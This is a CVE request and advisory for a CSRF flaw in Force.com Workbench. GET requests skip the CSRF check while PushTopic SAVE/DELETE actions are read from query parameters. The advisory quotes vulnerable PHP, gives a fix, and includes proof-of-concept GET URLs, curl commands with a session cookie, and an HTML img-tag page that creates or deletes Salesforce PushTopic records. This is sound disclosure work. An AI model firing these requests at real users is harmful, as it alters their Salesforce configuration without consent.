# CVE Request: CSRF in Force.com Workbench StreamingController allows PushTopic DML via GET

## 1. Vulnerability Topic

Cross-Site Request Forgery in Force.com Workbench `StreamingController` allows authenticated PushTopic DML actions to be triggered through tokenless GET requests.

## 2. Vendor / GitHub Repo

- Vendor / project: Force.com Workbench / Workbench
- GitHub repository: `forceworkbench/forceworkbench`
- Repository URL: https://github.com/forceworkbench/forceworkbench
- Public issue listing: https://github.com/forceworkbench/forceworkbench/issues
- New issue URL: https://github.com/forceworkbench/forceworkbench/issues/new
  - Note: GitHub currently shows "Issue creation is restricted in this repository" for ordinary users, so external reporters may not be able to create a public issue directly.

## 3. Product Name

Workbench, also known as Force.com Workbench / Salesforce Workbench.

## 4. Release Version / Commit Hash / Affected Range

Confirmed affected:

- `forceworkbench/forceworkbench` tag/release `65.0.0`.
- Current public `main` branch as observed on 2026-06-27, which contains the same vulnerable pattern.
- InvAudit target snapshot dated 2026-06-25 with `workbench/config/constants.php` setting `$GLOBALS["WORKBENCH_VERSION"] = "66.0.0"`.
- Public hosted Workbench page also reports `Workbench 66.0.0`.

Affected range:

- Confirmed affected range: `65.0.0` through `66.0.0` snapshots that contain both vulnerable conditions:
  1. `workbench/session.php` skips CSRF validation for `GET` requests.
  2. `workbench/controllers/StreamingController.php` dispatches PushTopic `SAVE` / `DELETE` actions from `$_REQUEST`.
- Older versions may also be affected if they contain the same `$_REQUEST`-based PushTopic DML dispatch and GET-only CSRF bypass pattern. The final historical range should be confirmed by the maintainer or CNA.

Commit hash:

- The supplied InvAudit source archive does not include `.git` metadata, so a commit hash is not available from the local artifact.
- The public tag `65.0.0` and current `main` branch are sufficient to reproduce the vulnerable code pattern.

## 5. Vulnerability Type

- Cross-Site Request Forgery (CSRF)
- Unsafe GET state-changing action
- Missing CSRF validation on a reachable state-changing request path

## 6. CWE

- Primary: CWE-352 — Cross-Site Request Forgery (CSRF)
- Secondary: CWE-749 — Exposed Dangerous Method or Function, because state-changing PushTopic DML is exposed through a request path that can be triggered by a cross-site GET request.

## 7. Vulnerability Summary

Force.com Workbench protects state-changing requests with a global CSRF token check in `workbench/session.php`, but that check only runs when the HTTP method is not `GET`. The `StreamingController` breaks this assumption by reading PushTopic DML parameters from `$_REQUEST`, which includes both query string parameters and POST body parameters. As a result, an attacker can craft a GET request to `/workbench/streaming.php` with `PUSH_TOPIC_DML=SAVE` or `PUSH_TOPIC_DML=DELETE` and cause an authenticated Workbench user to create, update, or delete Salesforce PushTopic records without a valid CSRF token.

The issue is authenticated CSRF. The attacker cannot directly read the cross-origin response, but can induce the victim browser to perform the state-changing DML request with the victim's active Workbench/Salesforce session.

## 8. Root Cause

The root cause is the combination of two source-code decisions:

1. `workbench/session.php` assumes that GET requests are read-only and therefore skips CSRF validation for `GET`:

```php
if ($_SERVER['REQUEST_METHOD'] != 'GET') {
    validateCsrfToken();
}
```

2. `workbench/controllers/StreamingController.php` uses `$_REQUEST` for state-changing PushTopic DML dispatch:

```php
$this->selectedTopic = new PushTopic(
    isset($_REQUEST['pushTopicDmlForm_Id'])         ? $_REQUEST['pushTopicDmlForm_Id']         : null,
    isset($_REQUEST['pushTopicDmlForm_Name'])       ? $_REQUEST['pushTopicDmlForm_Name']       : null,
    isset($_REQUEST['pushTopicDmlForm_ApiVersion']) ? $_REQUEST['pushTopicDmlForm_ApiVersion'] : null,
    isset($_REQUEST['pushTopicDmlForm_Query'])      ? $_REQUEST['pushTopicDmlForm_Query']      : null);

if (isset($_REQUEST['PUSH_TOPIC_DML'])) {
    $this->isAjax = true;

    if ($_REQUEST['PUSH_TOPIC_DML'] == "SAVE") {
        $this->save();
    } else if ($_REQUEST['PUSH_TOPIC_DML'] == "DELETE") {
        $this->delete();
    }
}
```

Because `$_REQUEST` includes GET parameters, a GET request can reach `save()` or `delete()`. `save()` calls `dml("PATCH", ...)` or `dml("POST", ...)`; `delete()` calls `dml("DELETE", ...)`; and `dml()` sends the corresponding REST request to Salesforce's `PushTopic` object using the victim's authenticated Workbench context.

## 9. Attack Preconditions

An attacker needs the following conditions:

1. The victim is logged in to Workbench.
2. The victim's Workbench session and Salesforce OAuth/session context are still valid.
3. The victim's Salesforce user has permission to create, update, or delete `PushTopic` records.
4. The attacker can induce the victim to open an attacker-controlled page, click a link, or load a cross-site resource.
5. For delete/update of an existing PushTopic, the attacker needs a valid target PushTopic ID. For create, the attacker can provide a new name/query/API version directly.

## 10. Impact Analysis

An attacker can perform unauthorized Salesforce PushTopic DML through the victim's authenticated Workbench session, including:

- Creating a new PushTopic with attacker-selected name, SOQL query, and API version.
- Updating an existing PushTopic if a target ID is supplied.
- Deleting an existing PushTopic if a target ID is supplied.

Potential consequences include:

- Disruption of Streaming API consumers relying on existing PushTopics.
- Unauthorized modification of integration or monitoring configuration.
- Creation of attacker-selected PushTopic queries, which may affect downstream event consumers depending on how the organization uses Streaming API.
- Loss of integrity and availability for PushTopic configuration in a Salesforce org.

Suggested severity: Medium. The issue requires an authenticated victim and suitable Salesforce permissions, but it performs real state-changing operations without a valid CSRF token.

## 11. Affected Code

### `workbench/session.php`

In the supplied 66.0.0 snapshot:

```php
// lines 84-86
if ($_SERVER['REQUEST_METHOD'] != 'GET') {
    validateCsrfToken();
}
```

### `workbench/shared.php`

In the supplied 66.0.0 snapshot:

```php
// lines 139-151
function validateCsrfToken($doError = true) {
    if (isset($GLOBALS['SKIP_CSRF_VALIDATION'])) {
        return true;
    }
    if (!isset($_REQUEST['CSRF_TOKEN']) || $_REQUEST['CSRF_TOKEN'] != getCsrfToken()) {
        if ($doError) {
            httpError("403 Forbidden", "Invalid or missing required CSRF token");
        } else {
            return false;
        }
    }
    return true;
}
```

### `workbench/controllers/StreamingController.php`

In the supplied 66.0.0 snapshot:

```php
// lines 23-37
$this->selectedTopic = new PushTopic(
    isset($_REQUEST['pushTopicDmlForm_Id'])         ? $_REQUEST['pushTopicDmlForm_Id']         : null,
    isset($_REQUEST['pushTopicDmlForm_Name'])       ? $_REQUEST['pushTopicDmlForm_Name']       : null,
    isset($_REQUEST['pushTopicDmlForm_ApiVersion']) ? $_REQUEST['pushTopicDmlForm_ApiVersion'] : null,
    isset($_REQUEST['pushTopicDmlForm_Query'])      ? $_REQUEST['pushTopicDmlForm_Query']      : null);

if (isset($_REQUEST['PUSH_TOPIC_DML'])) {
    $this->isAjax = true;

    if ($_REQUEST['PUSH_TOPIC_DML'] == "SAVE") {
        $this->save();
    } else if ($_REQUEST['PUSH_TOPIC_DML'] == "DELETE") {
        $this->delete();
    }
}
```

```php
// lines 61-70
private function save() {
    if ($this->selectedTopic->Id != null && $this->selectedTopic->Id != "undefined") {
        $this->dml("PATCH", "Updated", "Updating", "/" . $this->selectedTopic->Id, $this->selectedTopic->toJson(false));
    } else {
        $this->dml("POST", "Created", "Creating", "", $this->selectedTopic->toJson(false));
    }
}

private function delete() {
    $this->dml("DELETE", "Deleted", "Deleting", "/".$this->selectedTopic->Id, null);
}
```

## 12. PoC

### Controlled reproduction notes

Run this only against a Workbench instance and Salesforce org that you own or are explicitly authorized to test. The vulnerability is a CSRF issue, so the attacker does not need to read the response; the security impact is the state-changing request performed with the victim's active Workbench/Salesforce session.

#### PoC A: create a PushTopic through a tokenless GET request

While authenticated to Workbench with a Salesforce user that has permissions to create `PushTopic` records, request the following URL from the same browser session. Replace the host with the tested Workbench instance.

```text
GET /workbench/streaming.php?PUSH_TOPIC_DML=SAVE&pushTopicDmlForm_Name=InvAudit_CSRF_PoC&pushTopicDmlForm_ApiVersion=66.0&pushTopicDmlForm_Query=SELECT+Id,Name+FROM+Account
```

Equivalent `curl` shape when using an authorized test session cookie:

```bash
curl -i \
  -b 'PHPSESSID=<authorized-test-session>' \
  'https://<workbench-host>/workbench/streaming.php?PUSH_TOPIC_DML=SAVE&pushTopicDmlForm_Name=InvAudit_CSRF_PoC&pushTopicDmlForm_ApiVersion=66.0&pushTopicDmlForm_Query=SELECT+Id,Name+FROM+Account'
```

Vulnerable behavior: Workbench accepts the GET request without a `CSRF_TOKEN` and invokes the PushTopic DML flow.

#### PoC B: delete an existing PushTopic through a tokenless GET request

Use only a test PushTopic ID created in a test org.

```text
GET /workbench/streaming.php?PUSH_TOPIC_DML=DELETE&pushTopicDmlForm_Id=<PushTopicId>
```

Equivalent `curl` shape:

```bash
curl -i \
  -b 'PHPSESSID=<authorized-test-session>' \
  'https://<workbench-host>/workbench/streaming.php?PUSH_TOPIC_DML=DELETE&pushTopicDmlForm_Id=<PushTopicId>'
```

Vulnerable behavior: Workbench accepts the GET request without a `CSRF_TOKEN` and invokes `DELETE /services/data/v*/sobjects/PushTopic/<PushTopicId>` through the victim's Salesforce session.

#### Browser CSRF shape

The following demonstrates why this is exploitable cross-site: a browser can issue the GET request with the victim's Workbench cookies. Use only in a controlled environment.

```html
<!doctype html>
<html>
  <body>
    <img src="https://<workbench-host>/workbench/streaming.php?PUSH_TOPIC_DML=SAVE&pushTopicDmlForm_Name=InvAudit_CSRF_PoC&pushTopicDmlForm_ApiVersion=66.0&pushTopicDmlForm_Query=SELECT+Id,Name+FROM+Account" />
  </body>
</html>
```


## 13. Expected Result

Expected secure behavior:

1. `GET /workbench/streaming.php?...PUSH_TOPIC_DML=...` must not perform any state-changing operation.
2. PushTopic `SAVE` and `DELETE` operations should require `POST` or another non-GET unsafe method.
3. The request must include a valid `CSRF_TOKEN` bound to the victim's Workbench session.
4. A missing or invalid CSRF token must result in `403 Forbidden` or equivalent rejection.
5. The controller should read DML parameters from `$_POST`, not `$_REQUEST`, for state-changing actions.

Suggested minimal fix:

```php
if (isset($_POST['PUSH_TOPIC_DML'])) {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        httpError("405 Method Not Allowed", "PushTopic DML requires POST");
    }

    validateCsrfToken();

    if ($_POST['PUSH_TOPIC_DML'] === "SAVE") {
        $this->save();
    } else if ($_POST['PUSH_TOPIC_DML'] === "DELETE") {
        $this->delete();
    }
}
```

Also replace PushTopic DML parameter reads from `$_REQUEST[...]` with `$_POST[...]` on the DML path.

## 14. Report Status

- Status: Maintainer declined / no fix planned according to reporter-provided context and the repository's public `SECURITY.md`, which states that no further security updates will be provided.
- Public GitHub issue creation appears restricted for external users.
- CVE requested by reporter: pending.
- Disclosure status: draft for coordinated CVE request and/or public advisory.

## 15. Credit

fa1c4 <azesinter@mail.ustc.edu.cn>
